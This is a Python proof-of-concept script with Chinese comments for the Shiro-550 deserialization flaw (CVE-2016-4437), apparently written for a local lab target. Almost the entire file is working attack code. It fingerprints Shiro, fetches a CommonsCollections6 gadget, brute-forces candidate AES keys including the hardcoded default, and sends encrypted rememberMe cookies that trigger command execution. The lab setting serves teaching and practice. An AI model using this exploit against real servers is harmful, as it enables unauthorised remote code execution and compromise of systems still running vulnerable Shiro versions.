#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shiro-550 (CVE-2016-4437) 一键验证 —— 零第三方依赖

原理一句话：
    Shiro 1.2.4 及以前，CookieRememberMeManager 的 AES 密钥是写死在代码里的
    常量 kPH+bIxk5D2deZiIxcaaaA==。服务端收到 rememberMe cookie 时，
    先 Base64 解码、再 AES 解密、最后**直接 readObject**——中间没有任何
    完整性校验，也没有类白名单。于是"用默认密钥加密一段 CC6 序列化数据"
    就等于命令执行。

和常见 exp 的区别：
    别人给的是"已经算好的 cookie"。这里是在 Python 里真的跑一遍 AES-CBC：
    下载明文的 CC6 字节 → 用每个候选 key 加密 → 发出去 → 看 flag 文件。
    这样你能自己改命令、改 key、甚至观察不同 key 长度的影响。

用法：
    python3 poc/shiro550_exp.py
    python3 poc/shiro550_exp.py --url http://127.0.0.1:8901
    python3 poc/shiro550_exp.py --key kPH+bIxk5D2deZiIxcaaaA==
"""

import argparse
import base64
import os
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import aes

HERE = os.path.dirname(os.path.abspath(__file__))

# Shiro 判断"这是不是自己的 cookie"靠的是一个特征：解析失败就回一个
# rememberMe=deleteMe 的 Set-Cookie。爆破时它是唯一可靠的指纹。
DELETE_ME = "deleteMe"


def opener():
    """不走系统代理：本地靶场被 http_proxy 劫持是常见坑"""
    return urllib.request.build_opener(urllib.request.ProxyHandler({}))


OPENER = opener()


def http(base, path, cookie=None, timeout=10):
    req = urllib.request.Request(base + path)
    if cookie is not None:
        req.add_header("Cookie", "rememberMe=" + cookie)
    try:
        with OPENER.open(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}


def load_keys(path):
    keys = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                if len(base64.b64decode(line)) != 16:
                    continue
            except Exception:
                continue
            keys.append(line)
    return keys


def fetch_payload(base):
    """
    从靶场的 /payloads/cc6.bin 下载 CC6 的原始序列化字节。

    这一步合法地"公开"了：拿到明文 gadget 毫无意义，还缺一把钥匙。
    真实攻防里这一步是 ysoserial 在本地生成的，不需要目标配合。
    """
    status, body, _ = http(base, "/payloads/cc6.bin")
    if status != 200 or len(body) < 100:
        raise SystemExit(
            "[x] 取不到 /payloads/cc6.bin（HTTP %s，%d 字节）。\n"
            "    确认靶场已经起来，并且 --lab.mode=550。" % (status, len(body)))
    return body


def fingerprint(base):
    """
    确认目标是 Shiro：发一个随便的 rememberMe，看有没有 deleteMe。
    顺手说明一下——这一步在真实渗透里就是 fofa/指纹识别在干的事。
    """
    status, _, headers = http(base, "/", cookie="AAAAAAAAAAAAAAAAAAAAAA==")
    raw = " ".join("%s: %s" % (k, v) for k, v in headers.items())
    return DELETE_ME in raw


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8901")
    ap.add_argument("--key", help="只试这一个 key，不跑字典")
    ap.add_argument("--keys", default=os.path.join(HERE, "keys.txt"))
    ap.add_argument("--delay", type=float, default=0.15,
                    help="每个 key 发完等多久再查 flag（秒）。")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    print("[*] 目标 %s" % base)

    status, _, _ = http(base, "/")
    if status == 0:
        raise SystemExit("[x] 连不上，先把靶场起起来：docker compose up -d shiro-550")

    if fingerprint(base):
        print("[+] 指纹命中：服务端回了 rememberMe=deleteMe，确认是 Shiro")
    else:
        print("[!] 没看到 deleteMe。可能是响应头被改写，继续尝试")

    payload = fetch_payload(base)
    print("[*] CC6 payload: %d 字节（命令：cat /flag > /tmp/out/flag.txt）" % len(payload))

    keys = [args.key] if args.key else load_keys(args.keys)
    print("[*] 候选 key：%d 个\n" % len(keys))

    t0 = time.time()
    for idx, key in enumerate(keys, 1):
        try:
            cookie = aes.shiro_encrypt(key, payload)
        except ValueError as e:
            print("    [%d/%d] %s 跳过（%s）" % (idx, len(keys), key, e))
            continue

        ht = time.time()
        http(base, "/", cookie=cookie)
        cost = (time.time() - ht) * 1000

        # Runtime.exec 是异步的：cat 还在写文件，HTTP 就已经返回了。
        # 不等这一下，会把"上一个 key 的成果"算到当前 key 头上——
        # 我第一次跑就踩了，命中位置比真实 key 靠后一位。
        time.sleep(args.delay)

        st, body, _ = http(base, "/out/flag.txt")
        if st == 200 and b"FLAG{" in body:
            print("    [%d/%d] %-28s … %.0f ms  ← 命中" % (idx, len(keys), key, cost))
            print("\n[+] 密钥：%s" % key)
            print("[+] 用时：%.2f 秒" % (time.time() - t0))
            print("[+] flag：%s" % body.decode("utf-8", "replace").strip())
            return

        print("    [%d/%d] %-28s … %.0f ms" % (idx, len(keys), key, cost))

    raise SystemExit(
        "\n[x] 字典跑完都没命中。\n"
        "    1) 这个靶场可能不是 1.2.4，默认 key 已经被换掉了（那要看 721）\n"
        "    2) 服务端 classpath 里没有 commons-collections，链子起不来\n"
        "    3) 换个更大的字典，或者先 --key 单测一个已知的")


if __name__ == "__main__":
    main()
